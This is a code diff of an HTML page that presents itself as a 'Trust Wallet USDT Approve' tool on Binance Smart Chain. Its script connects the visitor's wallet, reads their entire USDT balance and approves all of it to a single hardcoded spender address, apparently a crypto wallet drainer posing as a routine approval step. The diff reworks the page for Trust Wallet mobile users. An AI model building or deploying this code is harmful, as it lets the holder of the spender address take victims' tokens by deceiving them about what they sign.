@@ -1,129 +1,96 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>USDT Approve DApp</title>
-
-  <!-- Web3Modal -->
-  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
-
-  <!-- WalletConnect Provider -->
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-
-  <!-- Web3.js -->
+  <meta charset="utf-8">
+  <title>Trust Wallet USDT Approve</title>
   <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.7.4/dist/web3.min.js"></script>
-
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+    body { font-family: sans-serif; text-align: center; margin-top: 80px; }
     button { padding: 12px 24px; font-size: 18px; margin: 10px; cursor: pointer; }
     #status { margin-top: 20px; font-weight: bold; }
   </style>
 </head>
 <body>
 
-  <h1>USDT Approve DApp (BSC)</h1>
+  <h2>USDT Approve (Trust Wallet Mobile)</h2>
 
   <button id="connectBtn">🔌 Connect Wallet</button>
-  <button id="approveBtn" disabled>✅ Approve Full USDT</button>
+  <button id="approveBtn" disabled>✅ Approve USDT</button>
 
   <div id="status">Not connected</div>
 
   <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
-    const SPENDER_ADDRESS = "0xD0748bB40f7F262748dA3891836D2be4ee70405b"; // Replace with your spender contract
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+    const SPENDER_ADDRESS = "0xD0748bB40f7F262748dA3891836D2be4ee70405b"; // Replace with your spender
 
     const ERC20_ABI = [
-      { "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
-      { "constant": true, "inputs": [{"name":"owner","type":"address"}], "name": "balanceOf", "outputs": [{"name":"","type":"uint256"}], "type": "function" },
-      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name":"","type":"uint8"}], "type": "function" }
+      { "constant": false, "inputs": [ { "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+      { "constant": true, "inputs": [ { "name": "owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" },
+      { "constant": true, "inputs": [], "name": "decimals", "outputs": [ { "name": "", "type": "uint8" } ], "type": "function" }
     ];
 
     let web3;
-    let provider;
-    let web3Modal;
-    let selectedAccount;
+    let accounts;
 
-    const statusEl = document.getElementById('status');
-    const connectBtn = document.getElementById('connectBtn');
-    const approveBtn = document.getElementById('approveBtn');
-
-    async function init() {
-      const providerOptions = {
-        walletconnect: {
-          package: window.WalletConnectProvider.default,
-          options: {
-            rpc: {
-              56: "https://bsc-dataseed.binance.org/" // Binance Smart Chain Mainnet
-            },
-            chainId: 56
-          }
-        }
-      };
-
-      web3Modal = new window.Web3Modal.default({
-        cacheProvider: false,
-        providerOptions
-      });
-
-      connectBtn.addEventListener('click', connectWallet);
-      approveBtn.addEventListener('click', approveUSDT);
-    }
+    const status = document.getElementById("status");
+    const connectBtn = document.getElementById("connectBtn");
+    const approveBtn = document.getElementById("approveBtn");
 
     async function connectWallet() {
-      try {
-        provider = await web3Modal.connect();
-        web3 = new Web3(provider);
-
-        const accounts = await web3.eth.getAccounts();
-        selectedAccount = accounts[0];
-
-        statusEl.innerText = "Connected: " + selectedAccount;
-        approveBtn.disabled = false;
-
-        // Optional: Switch to BSC if not already
-        const networkId = await web3.eth.getChainId();
-        if (networkId !== 56) {
-          alert("Please switch to Binance Smart Chain (BSC).");
-        }
-      } catch (err) {
-        console.error(err);
-        statusEl.innerText = "Connection failed.";
-      }
-    }
-
-    async function approveUSDT() {
-      if (!web3 || !selectedAccount) {
-        alert("Please connect your wallet first.");
+      if (typeof window.ethereum === 'undefined') {
+        alert("Please open this DApp inside Trust Wallet or MetaMask browser.");
         return;
       }
 
       try {
-        const token = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);
-        const balance = await token.methods.balanceOf(selectedAccount).call();
-        const decimals = await token.methods.decimals().call();
+        web3 = new Web3(window.ethereum);
+        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-        if (balance === "0") {
-          statusEl.innerText = "USDT balance is zero.";
-          return;
-        }
-
-        statusEl.innerText = `Approving ${balance / (10 ** decimals)} USDT...`;
-
-        await token.methods.approve(SPENDER_ADDRESS, balance).send({ from: selectedAccount })
-          .on('transactionHash', hash => {
-            statusEl.innerText = "Transaction sent: " + hash;
-          })
-          .on('receipt', receipt => {
-            statusEl.innerText = "✅ Approval confirmed in block " + receipt.blockNumber;
-          });
-
+        const user = accounts[0];
+        status.innerText = "Connected: " + user;
+        approveBtn.disabled = false;
       } catch (err) {
-        console.error(err);
-        statusEl.innerText = "❌ Approval failed or was rejected.";
+        console.error("Connection error:", err);
+        status.innerText = "❌ Connection failed.";
       }
     }
 
-    window.addEventListener('load', init);
+    async function approveUSDT() {
+      if (!web3 || !accounts || accounts.length === 0) {
+        alert("Connect wallet first.");
+        return;
+      }
+
+      try {
+        const user = accounts[0];
+        const token = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);
+
+        const balance = await token.methods.balanceOf(user).call();
+        const decimals = await token.methods.decimals().call();
+
+        if (balance === "0") {
+          status.innerText = "❌ USDT balance is 0.";
+          return;
+        }
+
+        const readableAmount = balance / (10 ** decimals);
+        status.innerText = `Approving ${readableAmount} USDT...`;
+
+        await token.methods.approve(SPENDER_ADDRESS, balance).send({ from: user })
+          .on('transactionHash', hash => {
+            status.innerText = "⏳ Tx sent: " + hash;
+          })
+          .on('receipt', receipt => {
+            status.innerText = "✅ Approved in block " + receipt.blockNumber;
+          });
+      } catch (err) {
+        console.error("Approve error:", err);
+        status.innerText = "❌ Approval failed.";
+      }
+    }
+
+    connectBtn.addEventListener('click', connectWallet);
+    approveBtn.addEventListener('click', approveUSDT);
   </script>
 
 </body>
